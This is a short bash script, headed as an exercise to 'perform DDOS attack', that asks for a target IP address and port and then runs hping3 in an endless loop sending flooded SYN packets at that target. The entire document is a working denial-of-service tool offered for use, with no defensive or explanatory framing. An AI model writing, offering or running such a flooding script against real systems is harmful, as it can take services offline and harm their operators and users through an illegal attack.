#!/bin/bash
# Write a Shell Script to Perform DDOS Attack

echo "Enter the IP Address: "
read ip

echo "Enter the Port Number: "
read port


while true
do
    echo "Attacking $ip on port $port"
    hping3 -c 1 -d 120 -S -w 64 -p $port --flood $ip
done
